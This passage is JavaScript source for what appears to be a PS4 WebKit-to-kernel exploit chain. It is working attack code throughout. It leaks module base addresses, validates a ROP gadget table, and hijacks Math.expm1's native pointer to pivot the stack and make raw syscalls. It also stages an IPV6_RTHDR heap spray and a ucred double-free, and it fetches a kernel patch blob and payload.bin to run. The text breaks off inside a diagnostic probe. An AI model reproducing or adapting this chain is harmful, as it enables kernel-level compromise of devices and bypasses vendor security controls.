// ?v=10 must match mem.js's specifier EXACTLY or core.js builds a second
// module record and releaseFakeCell() (only call site: mem.js:662) reaches a
// virgin instance, pinning ~137 MB for the life of the page.
import { establishPrimitive } from "./core.js?v=10";
import { installWindowP, pairStatus } from "./mem.js";
import { int64 } from "./int64.js";
import { offsetsFor } from "./ps4_offsets.js";

const outEl = document.getElementById("out");
const stateEl = document.getElementById("state");
const lines = [];
let passCount = 0, failCount = 0;
const params = new URLSearchParams(location.search);
const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";

function post(tag, detail) {
    try {
        const x = new XMLHttpRequest();
        x.open("GET", "log?m=" + encodeURIComponent("[" + tag + "] "
            + String(detail == null ? "" : detail)), true);
        x.send();
    } catch (e) { }
    try {
        const x = new XMLHttpRequest();
        x.open("POST", "t", true);
        x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        x.send("PS4-S10&tag=" + encodeURIComponent(tag)
             + "&detail=" + encodeURIComponent(String(detail == null ? "" : detail)));
    } catch (e) { }
}

const VERBOSE = params.get("verbose") === "1";
const PROSE = [
    / -- /, /\.\s/, /;\s/,
    /,\s+(which|so|and that|because|since|as that)\s/,
    /\s+(because|rather than|instead of|so that|which is|which means|which the|so the)\s/,
    /\s+so\s+[a-z]/,
    /\s+\([a-z][^)]{40,}\)/,
];
function terse(s) {
    if (VERBOSE || s == null) return s;
    s = String(s);
    for (const re of PROSE) {
        const m = re.exec(s);
        if (m && m.index > 0) s = s.slice(0, m.index);
    }
    s = s.replace(/\s+$/, "");
    if (s.length > 140) s = s.slice(0, 140) + "...";
    return s;
}
function mark(tag, detail) {

    const raw = detail;
    detail = terse(detail);
    lines.push(tag + (detail == null || detail === "" ? "" : "  " + detail));
    const esc = t => String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;");
    outEl.innerHTML = lines.map(function (l) {
        l = esc(l);
        const c = /FAIL|ERROR|THREW|REBOOT|MISS|LOST|POISON|TIMEOUT|MISMATCH|ABORTED/i.test(l) ? "bad"
                : /WARN|SKIP|REFUSED|COMMITTED|DIRTY/i.test(l) ? "warn"
                : /\bOK\b|PASS|ACHIEVED|RUNNING|ARMED/i.test(l) ? "ok" : "";
        return c ? '<span class="' + c + '">' + l + "</span>" : l;
    }).join("\n");
    outEl.scrollTop = outEl.scrollHeight;
    post(tag, raw);
}

function trace(tag, detail) { if (VERBOSE) mark(tag, detail); else post(tag, detail); }
function state(t, c) { stateEl.textContent = t; stateEl.className = c || ""; }
function check(name, ok, detail) {
    if (ok) { passCount++; mark("PROOF-OK", name + (detail ? "  " + detail : "")); }
    else { failCount++; mark("PROOF-FAIL", name + (detail ? "  " + detail : "")); }
    return ok;
}
function hx(n) { return "0x" + (n >>> 0).toString(16); }

const SYS = { read: 3, write: 4, close: 6, getpid: 20, getuid: 24, setuid: 0x17,
              setegid: 44, setregid: 131, setgroups: 80, setreuid: 126, geteuid: 25,
              getgid: 47, getegid: 43, open: 5,
socket: 0x61, netcontrol: 0x63, socketpair: 0x87, kqueue: 0x16a,
               sendmsg: 0x1c, recvmsg: 0x1b,
               readv: 0x78, writev: 0x79, sysctl: 0xca, pipe: 0x2a, fcntl: 0x5c,
              setsockopt: 0x69, getsockopt: 0x76, sched_yield: 0x14b,
              rtprio_thread: 0x1d2, cpuset_setaffinity: 0x1e8,
              cpuset_getaffinity: 0x1e7, thr_self: 432,

              ioctl: 0x36, mmap: 0x1dd, jitshm_create: 0x215, kexec: 0x295,
               clock_gettime: 232 };
const NETEVENT_SET_QUEUE = 0x20000003, NETEVENT_CLEAR_QUEUE = 0x20000007;
const AF_UNIX = 1, AF_INET6 = 28, SOCK_STREAM = 1;
const IPPROTO_IPV6 = 41, IPV6_RTHDR = 51;
const UCRED_SIZE = 0x168;
const KQUEUE_SIZE = 0x100;
const NUM_LEAK_KQUEUE = 5000;

const KQ_BATCH = 8;
const KQ_HDR_MAGIC = 0x1430000;

const NUM_UIO_IOV = 0x14, UIO_SIZE = 0x30;
const NUM_UIO_SPRAY = 10000;
const NUM_IOV_SPRAY_MAX = 100000;
const UIO_READ = 0, UIO_WRITE = 1, UIO_SYSSPACE = 1;
const SOL_SOCKET = 0xffff, SO_SNDBUF = 0x1001, SO_TYPE = 0x3;

const PIPEBUF_SIZEOF = 0x18, PIPE_PAGE = 0x4000, FILEDESCENT_SIZE = 8;
const F_SETFL = 4, O_NONBLOCK = 4;
const IP6_RTHDR0_SIZE = 8, IN6_ADDR_SIZE = 0x10;
const NUM_MSG_IOV = 0x17, IOVEC_SIZE = 0x10, MSGHDR_SIZE = 0x30;
const NUM_IPV6_SOCK = 0x100;

const RTHDR_TAG = 0x13370000;
const MAX_ROUNDS_TWIN = 10, MAX_ROUNDS_TRIPLET = 500, FIND_TRIPLET_FAST = 5000;

const RTP_PRIO_REALTIME = 2, RTP = 0x100, RTP_SET = 1, MAIN_CORE = 7;
const RTP_LOOKUP = 0, RTP_PRIO_NORMAL = 0;
const CPU_LEVEL_WHICH = 3, CPU_WHICH_TID = 1;
const JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);

const keepAlive = [];
const workers = [];
let mainMf = null, mainOrig = null, mainArmed = false;
let committed = false, rebootRequired = false;

let kreadPoisoned = false;
let uafSock = 0;
let uafFpSaved = null;
let fd0IsSocket = 0;
let sprayFds = [0, 0];

let savedMask = null, savedPrio = null, restoreCtx = null, attrsRestored = false;

let allDone = false;

(async function () {
    let p = null;
    try {

        const NUM_IOV_WORKER = params.has("iov")
            ? parseInt(params.get("iov"), 10) : 4;
        const NUM_ATTEMPT = params.has("attempts")
            ? parseInt(params.get("attempts"), 10) : 8;
        const NUM_IOV_SPRAY = params.has("spray")
            ? parseInt(params.get("spray"), 10) : 0x100;
        const { key, off } = offsetsFor(navigator.userAgent);
        mark("FW", key || "(not a PS4 UA)");
        if (!off) { state("no offsets for this firmware", "bad"); return; }
        mark("FW-STATUS", off.fw_status || "none");
        mark("PLAN", "iov_workers=" + NUM_IOV_WORKER + " attempts=" + NUM_ATTEMPT
            + " spray=" + NUM_IOV_SPRAY
            + " mode=" + (STOP_BEFORE_DOUBLE ? "stop-before-double" : "armed"));

        let kpatch = null, payload = null;
        // off.kpatch wins when a firmware shares another's kernel and therefore
        // its blob -- 12.02 uses 1200.bin. Otherwise derive it from the key.
        const kpatchName = off && off.kpatch ? "patches/" + off.kpatch
            : key ? "patches/" + key.replace(".", "") + ".bin" : null;
        const KPATCH_JMP_SITES = [];
        try {
            if (kpatchName) {
                const r = await fetch(kpatchName);
                if (r.ok) kpatch = new Uint8Array(await r.arrayBuffer());
            }
        } catch (e) { mark("KPATCH-FETCH-THREW", e.message); }
        if (kpatch) {

            for (let i = 0; i + 7 <= kpatch.length; ++i) {
                if (kpatch[i] !== 0xc6 || kpatch[i + 1] !== 0x81) continue;
                if (kpatch[i + 6] !== 0xeb) continue;
                KPATCH_JMP_SITES.push(((kpatch[i + 2]) | (kpatch[i + 3] << 8)
                    | (kpatch[i + 4] << 16) | (kpatch[i + 5] << 24)) >>> 0);
            }
        }
        mark("KPATCH-BLOB", kpatch
            ? "blob=" + kpatchName + " bytes=" + kpatch.length
              + " sites=" + KPATCH_JMP_SITES.length
            : "blob=" + kpatchName + " MISSING");
        try {
            const r = await fetch("payload.bin");
            if (r.ok) payload = new Uint8Array(await r.arrayBuffer());
        } catch (e) { mark("PAYLOAD-FETCH-THREW", e.message); }
        mark("PAYLOAD-BLOB", payload
            ? "bytes=" + payload.length + " entry="
              + (payload[0] === 0xe9 ? "e9-jmp-rel32" : "NOT-e9")
            : "MISSING");

        state("running the primitive...", "warn");
        await new Promise(r => setTimeout(r, 0));

        const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
        const carrier = await establishPrimitive({
            maxAttempts: 6,
            onEvent: (t, d, a) => (PRIMITIVE_LOUD.test(t) ? mark : trace)
                (t, (a != null ? "[" + a + "] " : "") + (d || ""))
        });
        // THE EXPERIMENT. Promotion releases the ~137 MB the OOM is made of --
        // proven: PAIR-UP released=13 on 2026-08-16 14:44. But releaseFakeCell()
        // only NULLS references; it does not free anything. It converts 137 MB
        // of quiet pinned memory into 137 MB of garbage and leaves the sweep to
        // JSC, which last time chose to run it somewhere inside the triple-free
        // race ~500 ms later (cr_refcnt-driven-1 rounds=256, twice).
        //
        // So: release it HERE, then make the collection happen HERE too, before
        // a single worker or kernel object exists.
        // OPT-IN, not opt-out. Promotion releases the ~137 MB -- but releasing
        // is not freeing: it turns quiet pinned memory into garbage that JSC
        // collects whenever it chooses, including mid-race. The sweep below was
        // meant to force that collection at a safe point and MEASURABLY DOES
        // NOT: 21 consecutive runs logged worst_cycle_ms 67-83 against a 60 ms
        // floor, i.e. a few ms of overhead and no full collection anywhere.
        // Until the sweep can be shown to actually collect, the pinned profile
        // is the safer one. ?pair=1 to experiment.
        const PAIR_ON = params.get("pair") === "1";
        const SWEEP_CYCLES = params.has("sweep")
            ? parseInt(params.get("sweep"), 10) : 6;
        const SWEEP_MS = params.has("sweepms")
            ? parseInt(params.get("sweepms"), 10) : 60;
        const SWEEP_MB = params.has("sweepmb")
            ? parseInt(params.get("sweepmb"), 10) : 8;

        installWindowP(carrier, {
            promote: PAIR_ON,
            onEvent: (t, d) => (PRIMITIVE_LOUD.test(t) ? mark : trace)(t, d || "")
        });
        if (!window.p) throw new Error("window.p was not installed");
        p = window.p;
        mark("PAIR-STATUS", "state=" + pairStatus.state
            + " promoted=" + pairStatus.promoted
            + " stage=" + pairStatus.stage
            + (pairStatus.failedAt ? " failedAt=" + pairStatus.failedAt : "")
            + (pairStatus.error ? " error=" + pairStatus.error : ""));

        // Provoke the collection. globalThis.gc does not exist in a shipping
        // WebProcess (core.js:368 guards for it and never fires), so the only
        // levers are allocation pressure and turning the event loop -- the
        // incremental sweeper cannot run while we hold the thread.
        //
        // OBSERVABLE: worst_cycle_ms. A cycle much longer than floor_ms is a
        // collection landing here instead of on the race. If every cycle sits
        // at the floor, nothing was swept and this experiment did nothing.
        if (pairStatus.promoted && SWEEP_CYCLES > 0) {
            state("sweeping...", "warn");
            const t0 = Date.now();
            let worst = 0;
            for (let i = 0; i < SWEEP_CYCLES; ++i) {
                const c0 = Date.now();
                let junk = [];
                for (let k = 0; k < SWEEP_MB; ++k)
                    junk.push(new ArrayBuffer(0x100000));
                junk.length = 0; junk = null;
                await new Promise(r => setTimeout(r, SWEEP_MS));
                const dt = Date.now() - c0;
                if (dt > worst) worst = dt;
            }
            mark("SWEEP", "cycles=" + SWEEP_CYCLES + " mb=" + SWEEP_MB
                + " floor_ms=" + SWEEP_MS + " worst_cycle_ms=" + worst
                + " total_ms=" + (Date.now() - t0));
        } else {
            mark("SWEEP-SKIPPED", "promoted=" + pairStatus.promoted
                + " cycles=" + SWEEP_CYCLES);
        }
        mark("PRIMITIVE-OK", "");

        // ---- 13.52 MEASUREMENT (stage1: find the live webkit base) ----
        // No public 13.52 WebKit offsets exist. chain_1352.js probes the live
        // module with a PSFree-style backward text-magic walk from a known-good
        // pointer (the expm1 builtin, read via the fixed 0x18/0x28 JSFunction
        // layout) BEFORE the BASES block trusts the 13.00 seeds. Every page read
        // from nativeFn down to the .text base stays inside the module's mapped
        // text, so a non-matching build fails loudly (gadget-fit gate) -- it
        // cannot corrupt anything.
        //
        // OBSERVABLE: MEASURE-13.52 gives the TRUE webkitBase + measured
        // wk_expm1_builtin. CONFIRMED means the 13.52 module byte-matches 13.00
        // at the base AND the __error import/GOT chain resolves to a kernel
        // function pointer. DIFFERS-measured still logs the measured base so the
        // row can be rewritten, while the chain proceeds on seeds (gates will
        // trip harmlessly if they are wrong).
        // Measured bases recorded by the 13.52 measurement block, then used by
        // the BASES block below instead of the fixed 13.00-era k__error math.
        const MEASURED = { webkit: null, libkernel: null };
        if (key === "13.52") {
            const TEXT_MAGIC = [0xe5894855, 0x56415741, 0x54415541, 0x8d485053];
            const textMagicAt = a => {
                const q0 = p.read8(a), q1 = p.read8(a.add32(8));
                return q0.low === TEXT_MAGIC[0] && q0.hi === TEXT_MAGIC[1]
                    && q1.low === TEXT_MAGIC[2] && q1.hi === TEXT_MAGIC[3];
            };
            // nativeFn sits at webkitBase+0x2586880 on 13.00; the base is that
            // far BELOW nativeFn, so the walk must cover >= that plus slack.
            const WALK_MAX_BACK = 0x2800000;   // 40 MB covers seed 0x2586880 + margin
            // libkernel base: proven by dumps/libkernel.bin that the browser
            // libkernel begins with the SAME standard Sony-module prologue (the
            // game dump starts 55 48 89 e5 41 57 41 56 41 55 41 54 53 50 48 8d).
            // The __error import read from webkit's GOT (errFn) is a real
            // function pointer inside browser libkernel .text, so a downward
            // text-magic walk from it finds the libkernel base WITHOUT trusting
            // the 13.00-era k__error RVA (which is WRONG on 13.52 -- proven by
            // measure: errFn-0x26420 was NOT 0x4000-aligned, 0x837f83cd0).
            const LIBK_WALK_MAX = 0x80000;  // __error is early in the module
            try {
                const mCell = p.leakval(Math.expm1);
                const mNativeFn = p.read8(p.read8(mCell.add32(0x18))
                    .add32(off.wk_JSFunction_m_function));
                // walk DOWN from an address inside webkit .text to its base
                let cand = new int64(0, 0), steps = 0;
                const page = v => new int64(v.low & ~0x3fff, v.hi);
                const seedCand = mNativeFn.sub32(off.wk_expm1_builtin);
                if ((seedCand.low & 0x3fff) === 0 && textMagicAt(seedCand)) {
                    cand = seedCand;   // fast path: seed base byte-matches
                } else for (let off = 0; off <= WALK_MAX_BACK; off += 0x4000) {
                    const at = page(mNativeFn).sub32(off);
                    if (textMagicAt(at)) { cand = at; break; }
                    steps++;
                }
                if (cand.hi === 0 && cand.low === 0) {
                    mark("MEASURE-13.52", "DIFFERS-no-text-magic nativeFn="
                        + mNativeFn + " walked=" + steps + " of "
                        + (WALK_MAX_BACK / 0x4000));
                } else {
                    const measExp = mNativeFn.sub32(cand.low).low;
                    MEASURED.webkit = cand;
                    let verdict = "CONFIRMED";
                    let errFn = new int64(0, 0);
                    try {
                        errFn = p.read8(cand.add32(off.wk___imp___error));
                        // libkernel base: walk DOWN from the __error pointer
                        // page-aligned, within a bounded window above the
                        // module base, checking the proven text magic.
                        let lk = new int64(0, 0);
                        const epage = new int64(errFn.low & ~0x3fff, errFn.hi);
                        for (let o = 0; !lk.hi && o <= LIBK_WALK_MAX; o += 0x4000) {
                            const at = epage.sub32(o);
                            if (textMagicAt(at)) { lk = at; break; }
                        }
                        if (lk.hi) {
                            MEASURED.libkernel = lk;
                            verdict = "CONFIRMED";
                        } else {
                            verdict = "DIFFERS-libk-no-text-magic";
                        }
                        const kCand = errFn.sub32(off.k__error);
                        const bothOk = (errFn.hi > 0 && errFn.low >= 0x1000)
                            && (kCand.hi > 0 && (kCand.low & 0x3fff) === 0);
                        if (bothOk) verdict = "CONFIRMED";
                    } catch (e) {
                        verdict = "DIFFERS-import-read";
                    }
                    mark("MEASURE-13.52", verdict + " webkit=" + cand
                        + " meas_expm1=" + measExp
                        + " errfn=" + errFn
                        + " libkernel=" + (MEASURED.libkernel || "-")
                        + (verdict === "CONFIRMED" ? "" : ""));
                }
            } catch (e) {
                mark("MEASURE-13.52", "THREW " + e.message);
            }
            state("measuring 13.52 webkit...", "warn");
            await new Promise(r => setTimeout(r, 0));
        } else {
            mark("MEASURE-SKIPPED", "not-13.52");
        }

        const cell = p.leakval(Math.expm1);
        const nativeFn = p.read8(p.read8(cell.add32(0x18))
            .add32(off.wk_JSFunction_m_function));
        const webkitBase = MEASURED.webkit
            || nativeFn.sub32(off.wk_expm1_builtin);
        const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
        const libkernelBase = MEASURED.libkernel
            || errorFn.sub32(off.k__error);
        mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase
            + (MEASURED.webkit ? " (measured)" : "")
            + (MEASURED.libkernel ? " (measured)" : ""));
        const aligned = v => v.hi > 0 && (v.low & 0x3fff) === 0;
        if (!check("module-bases-0x4000-aligned",
            aligned(webkitBase) && aligned(libkernelBase), "")) return;

        const G = {};
        const GAD = [
            ["POP_RDI_RET", off.wk_POP_RDI_RET, [0x5f, 0xc3]],
            ["POP_RSI_RET", off.wk_POP_RSI_RET, [0x5e, 0xc3]],
            ["POP_RDX_RET", off.wk_POP_RDX_RET, [0x5a, 0xc3]],
            ["POP_RCX_RET", off.wk_POP_RCX_RET, [0x59, 0xc3]],
            ["POP_R8_RET", off.wk_POP_R8_RET, [null, 0x58, 0xc3]],
            ["POP_R9_RET", off.wk_POP_R9_RET, [null, 0x59, 0xc3]],
            ["POP_RAX_RET", off.wk_POP_RAX_RET, [0x58, 0xc3]],
            ["LEAVE_RET", off.wk_LEAVE_RET, [0xc9, 0xc3]],
            ["MOV_RDI_RAX_RET", off.wk_MOV_QWORD_PTR_RDI_RAX_RET, [0x48, 0x89, 0x07, 0xc3]],
            ["G0", off.wk_MOV_RDI_RSI_30_CALL, [0x48, 0x8b, 0x7e, 0x30]],
            ["G1", off.wk_POP_RAX_MOV_RAX_JMP_18, [0x58, 0x48, 0x8b, 0x07]],
            ["G2", off.wk_PUSH_RBP_MOV_RBP_RSP_10, [0x55, 0x48, 0x89, 0xe5]],
            ["G3", off.wk_MOV_RDI_RAX_8_CALL_20, [0x48, 0x8b, 0x78, 0x08]],
            ["G4", off.wk_MOV_RDX_RAX_18_CALL_10, [0x48, 0x8b, 0x50, off.pivot_view_sp]],
            ["G5", off.wk_PUSH_RDX_POP_RSP_RET, [0x52, 0x5c, 0xc3]],
        ];
        let gated = 0;
        for (const [nm, rva, pat] of GAD) {
            const a = webkitBase.add32(rva);
            let good = true;
            for (let i = 0; i < pat.length; ++i) {
                if (pat[i] === null) continue;
                if (p.read1(a.add32(i)) !== pat[i]) { good = false; break; }
            }
            if (good) { G[nm] = a; gated++; } else mark("GADGET-BAD", nm);
        }
        if (!check("gadget-table-fits-module", gated === GAD.length,
            gated + "/" + GAD.length)) return;
        const argGadget = [G.POP_RDI_RET, G.POP_RSI_RET, G.POP_RDX_RET,
                           G.POP_RCX_RET, G.POP_R8_RET, G.POP_R9_RET];

        const stubAddr = new Map();
        let seeded = 0;
        if (off.k_stubs) {
            for (const numStr in off.k_stubs) {
                const num = +numStr, o = off.k_stubs[numStr];
                const v = p.read8(libkernelBase.add32(o));
                if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) continue;
                if ((((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0) !== num) continue;
                stubAddr.set(num, libkernelBase.add32(o)); seeded++;
            }
        }
        const need = new Set(Object.keys(SYS).map(k => SYS[k])
            .filter(n => !stubAddr.has(n)));
        let scanned = 0;
        for (let o = 0; o < off.k_scan_stage1 && need.size; o += 16) {
            const v = p.read8(libkernelBase.add32(o));
            if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) continue;
            const num = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
            if (!need.has(num)) continue;
            stubAddr.set(num, libkernelBase.add32(o)); need.delete(num); scanned++;
        }
        mark("STUBS", "seeded=" + seeded + " scanned=" + scanned);
        const miss = Object.keys(SYS).filter(k => !stubAddr.has(SYS[k]));
        if (!check("syscall-page-needs-stub", miss.length === 0,
            miss.join(","))) return;

        function bufAddr(ab) {
            const c = p.leakval(ab);
            return p.read8(p.read8(c.add32(off.wk_ArrayBuffer_m_impl))
                .add32(off.wk_ArrayBuffer_m_contents_m_data));
        }
        function put(dv, at, v) {
            if (typeof v === "number") {
                dv.setUint32(at, v >>> 0, true);
                dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
            } else {
                dv.setUint32(at, v.low >>> 0, true);
                dv.setUint32(at + 4, v.hi >>> 0, true);
            }
        }
        const PB_SIZE = Math.max(0x28, (off.pivot_view_sp + 8 + 0xf) & ~0xf);
        function makeCtx() {
            const sb = new ArrayBuffer(0x20), pb = new ArrayBuffer(PB_SIZE);
            const kb = new ArrayBuffer(0x2000), fb = new ArrayBuffer(0x40);
            keepAlive.push(sb, pb, kb, fb);
            const c = { storeDv: new DataView(sb), pivotDv: new DataView(pb),
                stackDv: new DataView(kb), frameDv: new DataView(fb),
                stackU8: new Uint8Array(kb), frameU8: new Uint8Array(fb) };
            keepAlive.push(c.storeDv, c.pivotDv, c.stackDv, c.frameDv,
                c.stackU8, c.frameU8);
            c.S = bufAddr(sb); c.P = bufAddr(pb);
            c.K = bufAddr(kb); c.F = bufAddr(fb);
            put(c.storeDv, 0x00, G.G1); put(c.storeDv, 0x08, c.P);
            put(c.storeDv, 0x10, G.G3); put(c.storeDv, 0x18, G.G2);
            put(c.pivotDv, 0x00, c.P); put(c.pivotDv, 0x10, G.G5);
            put(c.pivotDv, 0x20, G.G4);
            return c;
        }
        function layout(c, target, args) {
            c.stackU8.fill(0); c.frameU8.fill(0);
            const insts = [];
            for (let i = 0; i < args.length; ++i) {
                insts.push(argGadget[i]); insts.push(args[i]);
            }
            const targetIdx = insts.length;
            insts.push(target);
            insts.push(G.POP_RDI_RET); insts.push(c.F);
            insts.push(G.MOV_RDI_RAX_RET);
            insts.push(G.POP_RAX_RET); insts.push(JSVALUE_UNDEFINED);
            insts.push(G.LEAVE_RET);
            let at = 0x2000 - 8 * insts.length;
            if (((c.K.low + at + 8 * targetIdx) & 0xf) !== 0) at -= 8;
            for (let i = 0; i < insts.length; ++i) put(c.stackDv, at + 8 * i, insts[i]);
            put(c.pivotDv, off.pivot_view_sp, c.K.add32(at));
        }
        const M = makeCtx();
        mainMf = p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function);
        mainOrig = p.read8(mainMf);
        const pivotObj = {};
        keepAlive.push(pivotObj);
        const pivotCell = p.leakval(pivotObj);
        p.write8(mainMf, G.G0);
        mainArmed = true;
        function callAddr(target, args) {
            layout(M, target, args);
            const saved = p.read8(pivotCell);
            p.write8(pivotCell, M.S);
            Math.expm1(pivotObj);
            p.write8(pivotCell, saved);
            return { lo: M.frameDv.getUint32(0, true),
                     hi: M.frameDv.getUint32(4, true),
                     i32: M.frameDv.getUint32(0, true) | 0 };
        }
        const sc = (num, ...a) => callAddr(stubAddr.get(num), a);
        function errno() {
            const r = callAddr(errorFn, []);
            const a = new int64(r.lo, r.hi);
            return (a.hi === 0 && a.low === 0) ? -1 : p.read4(a) | 0;
        }
        const pid = sc(SYS.getpid).i32;
        check("chain-reaches-kernel", pid > 0,
            "pid=" + pid + " uid=" + sc(SYS.getuid).i32);

        const scratchAb = new ArrayBuffer(0x1000); keepAlive.push(scratchAb);
        const scratch = bufAddr(scratchAb);
        const argAb = new ArrayBuffer(8); keepAlive.push(argAb);
        const argAddr = bufAddr(argAb), argDv = new DataView(argAb);
        const lenAb = new ArrayBuffer(8); keepAlive.push(lenAb);
        const lenAddr = bufAddr(lenAb), lenDv = new DataView(lenAb);
        const sprayAb = new ArrayBuffer(UCRED_SIZE); keepAlive.push(sprayAb);
        const sprayAddr = bufAddr(sprayAb), sprayDv = new DataView(sprayAb);
        const leakAb = new ArrayBuffer(UCRED_SIZE); keepAlive.push(leakAb);
        const leakAddr = bufAddr(leakAb), leakDv = new DataView(leakAb);
        // R2. getsockopt(IPV6_RTHDR) can copy out FEWER bytes than asked, and
        // every reader below then parses whatever the PREVIOUS call left in the
        // buffer. poops.js:1849 uses the same 0xee sentinel. Filling only the
        // requested window keeps this proportional to the copy already being
        // made -- this runs inside the spray loops.
        const leakU8 = new Uint8Array(leakAb);
        const R2_ON = params.get("r2") !== "0";
        let shortReads = 0;

        // ITEM 6(a). THE BURN LIST. After a double free, the sockets whose
        // rthdr aliases the freed ucred must never be touched again. The lethal
        // operation is setRthdr: on a socket that already owns an rthdr it is a
        // free-then-realloc, so re-spraying a burned socket FREES the aliased
        // chunk and leaves the other owner dangling. freeRthdr and close are
        // equally fatal. A burned fd is therefore excluded from every spray,
        // every scan, and the teardown close -- until kernel R/W can repair it.
        const burned = new Set();
        function burn(fd, why) {
            if (fd > 0 && !burned.has(fd)) {
                burned.add(fd);
                mark("BURNED", "fd=" + fd + " why=" + why + " total=" + burned.size);
            }
        }

        function buildRthdr(dv, size) {
            const n = Math.floor((size - IP6_RTHDR0_SIZE) / IN6_ADDR_SIZE);
            new Uint8Array(dv.buffer).fill(0);
            dv.setUint8(0, 0); dv.setUint8(1, n * 2);
            dv.setUint8(2, 0); dv.setUint8(3, n);
            return IP6_RTHDR0_SIZE + IN6_ADDR_SIZE * n;
        }
        const sprayLen = buildRthdr(sprayDv, UCRED_SIZE);
        const rthdrStat = { ok: 0, fail: 0 };
        const setRthdr = s => {
            const r = sc(SYS.setsockopt, s, IPPROTO_IPV6, IPV6_RTHDR,
                sprayAddr, sprayLen).i32;
            if (r === 0) { rthdrStat.ok++; } else { rthdrStat.fail++; }
            return r;
        };
        const freeRthdr = s => {
            // ITEM 6(a) chokepoint. The other guards filter at SELECTION time
            // (findTwins/findTriplet never hand back a burned fd). This is the
            // structural one: even if a future edit lets a burned fd through,
            // the free that would make it a double free cannot happen.
            if (burned.has(s)) {
                mark("FREERTHDR-REFUSED", "fd=" + s + " is burned");
                return -1;
            }
            return sc(SYS.setsockopt, s, IPPROTO_IPV6, IPV6_RTHDR, 0, 0).i32;
        };

        // `need` = the highest byte offset the CALLER will actually parse. A
        // copyout shorter than that is reported as -1 rather than handing back
        // the previous call's bytes. No mark() here -- this is a hot path; the
        // count is reported once at make_karw.
        function getRthdr(s, size, need) {
            if (R2_ON) leakU8.fill(0xee, 0, size);
            lenDv.setUint32(0, size, true);
            const rv = sc(SYS.getsockopt, s, IPPROTO_IPV6, IPV6_RTHDR,
                leakAddr, lenAddr).i32;
            if (rv !== 0) return -1;
            const got = lenDv.getUint32(0, true);
            if (R2_ON && need !== undefined && got < need) { shortReads++; return -1; }
            return got;
        }
        function netevent(sock, event) {
            argDv.setUint32(0, sock >>> 0, true); argDv.setUint32(4, 0, true);
            const r = sc(SYS.netcontrol, -1, event, argAddr, 8).i32;
            return { rv: r, err: r === -1 ? errno() : 0 };
        }
        // BD-J fallback (Poops.java:692-715): on 13.52 the kernel keeps ONE
        // netevent queue slot alive after a successful SET_QUEUE+failed CLEAR
        // -- the classic "cursed device" pattern. Poops retries SET_QUEUE on
        // ifindex=1 when ifindex=-1 refuses, and CLEARs on the SAME slot.
        function neteventSlot(slot, sock, event) {
            argDv.setUint32(0, sock >>> 0, true); argDv.setUint32(4, 0, true);
            const r = sc(SYS.netcontrol, slot, event, argAddr, 8).i32;
            return { rv: r, err: r === -1 ? errno() : 0 };
        }

        // The reference spends the pre-double-free reclaim spray as
        // sendmsg(0,msg,0) x0x80 and takes for granted that fd 0 is a socket
        // (netctrl.js:443, chain_poops.js:853). probe=fd0 RAW-gated that
        // assumption (2026-09-11): an fd 0 that is a pipe/console yields
        // ENOTSOCK and the spray allocates NO uio/iov at all. Open a fresh
        // AF_UNIX socketpair instead and hand back one end, so the reclaim
        // spray does not depend on what fd 0 happens to be in this process.
        // Returns the pair's first fd (>0) on success, else 0 (caller falls
        // back to fd 0, matching the reference exactly).
        function spraySockpair() {
            argDv.setUint32(0, 0, true); argDv.setUint32(4, 0, true);
            const r = sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32;
            if (r !== 0) return 0;
            const a = argDv.getInt32(0, true);
            const b = argDv.getInt32(4, true);
            sprayFds = [a, b];
            return a;
        }

        // ?probe=stage2  -- does the IPV6_RTHDR pktopts heap-spray that twin/triplet
        // detection relies on even WORK inside the game sandbox? If setRthdr
        // fails errno=5/ENOBUFS on every socket here, no double-free can ever
        // surface as twins and the whole stage-2 pipeline is dead in-game.
        if (params.get("probe") === "stage2") {
            const PEM2 = d => mark("P2STGE", d);
            PEM2("open AF_INET6 stream sockets and spray IPV6_RTHDR");
            const ok = [], fail = [];
            for (let i = 0; i < 8; ++i) {
                const s = sc(SYS.socket, AF_INET6, SOCK_STREAM, 0).i32;
                if (s === -1) { PEM2("socket#"+i+" failed errno=" + errno()); break; }
                sprayDv.setUint32(4, tagFor(i), true);
                const r = setRthdr(s);
                (r === 0 ? ok : fail).push(s);
                PEM2("sock=" + s + " setRthdr rv=" + r
                    + (r === -1 ? " errno=" + errno() : ""));
                const g = getRthdr(s, IP6_RTHDR0_SIZE, 8);
                PEM2("sock=" + s + " getRthdr rv=" + g + " tag=0x"
                    + (leakDv.getUint32(4, true) >>> 0).toString(16));
                sc(SYS.close, s);
            }
            PEM2("RESULT setOk=" + ok.length + " setFail=" + fail.length
                + " rthdrStat ok=" + rthdrStat.ok + " fail=" + rthdrStat.fail);
            mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
            return;
        }

        // ?probe=attemptshape  -- replicate the REAL attempt body (incl.
        // setuid(1)x2) and check whether CLEAR frees the slot. probe=netevent
        // EXP2 (no setuid) showed the slot freed after CLR rv=-1. The real
        // attempts leave both slots occupied -- the only added ingredients are
        // setuid(1)x2. If, with setuid, the slot stays occupied, then in the
        // real runs CLEAR is NOT cosmetic: no ucred is freed, hence no twins.
        if (params.get("probe") === "attemptshape") {
            const ASM = d => mark("ASHP", d);
            const s1 = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
            ASM("S1 fd=" + s1);
            const rs = neteventSlot(-1, s1, NETEVENT_SET_QUEUE);
            ASM("SET(-1,S1) rv=" + rs.rv + " err=" + rs.err);
            sc(SYS.close, s1);
            ASM("closed S1");
            const su1 = sc(SYS.setuid, 1).i32;
            ASM("setuid#1 rv=" + su1);
            const s2 = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
            ASM("reclaim fd=" + s2 + " expect=" + s1
                + (s2 === s1 ? "" : " MISMATCH"));
